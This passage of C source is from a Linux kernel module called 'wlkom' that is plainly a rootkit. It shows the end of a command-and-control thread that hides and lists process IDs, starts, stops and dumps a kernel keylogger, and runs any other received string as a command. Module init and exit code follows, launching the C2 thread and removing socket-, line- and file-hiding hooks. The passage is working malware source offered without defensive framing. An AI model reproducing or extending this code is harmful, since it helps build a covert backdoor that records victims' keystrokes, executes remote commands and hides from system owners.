                spin_unlock_irqrestore(&pid_lock, flags);
                send_msg(found ? "PID_UNHIDDEN\n" : "ERR:not_found\n",
                         found ? 13 : 14);
            }
        } else if (strcmp(buf, "LIST_HIDDEN_PIDS") == 0) {
            char resp[512];
            unsigned long flags;
            int i, off = 0;
            spin_lock_irqsave(&pid_lock, flags);
            for (i = 0; i < hidden_pid_count && off < 480; i++)
                off += snprintf(resp + off, sizeof(resp) - off,
                                "%d ", hidden_pids[i]);
            spin_unlock_irqrestore(&pid_lock, flags);
            if (off == 0) off = snprintf(resp, sizeof(resp), "(none)");
            resp[off++] = '\n';
            send_msg(resp, off);
        } else if (strcmp(buf, "KEYLOG_START") == 0) {
            keylogger_start();
            send_msg("KEYLOGGER_ON\n", 13);
        } else if (strcmp(buf, "KEYLOG_STOP") == 0) {
            keylogger_stop();
            send_msg("KEYLOGGER_OFF\n", 14);
        } else if (strcmp(buf, "KEYLOG_DUMP") == 0) {
            char *dump = kmalloc(KEYLOG_BUF_SIZE + 16, GFP_KERNEL);
            if (dump) {
                int len = keylog_dump(dump, KEYLOG_BUF_SIZE);
                if (len > 0) {
                    dump[len++] = '\n';
                    send_msg(dump, len);
                } else {
                    send_msg("(empty)\n", 8);
                }
                kfree(dump);
            }
        } else if (strcmp(buf, "KEYLOG_STATUS") == 0) {
            send_msg(keylogger_active ? "KEYLOGGER:ON\n" : "KEYLOGGER:OFF\n",
                     keylogger_active ? 13 : 14);
        } else {
            exec_cmd(buf);
        }
    }

    if (c2_sock) { sock_release(c2_sock); c2_sock = NULL; }
    printk(KERN_INFO "wlkom: thread stopped\n");
    return 0;
}

/* ===== INIT / EXIT ===== */

static int __init wlkom_init(void)
{
    printk(KERN_INFO "wlkom: module loaded\n");
    c2_thread = kthread_run(c2_thread_fn, NULL, "wlkom_c2");
    if (IS_ERR(c2_thread)) return PTR_ERR(c2_thread);
    return 0;
}

static void __exit wlkom_exit(void)
{
    running = 0;
    keylogger_stop();
    hide_ss_exit();
    hide_lines_exit();
    hide_files_exit();
    if (c2_sock) { sock_release(c2_sock); c2_sock = NULL; }
    if (c2_thread) kthread_stop(c2_thread);
    printk(KERN_INFO "wlkom: module unloaded\n");
}

module_init(wlkom_init);
module_exit(wlkom_exit);
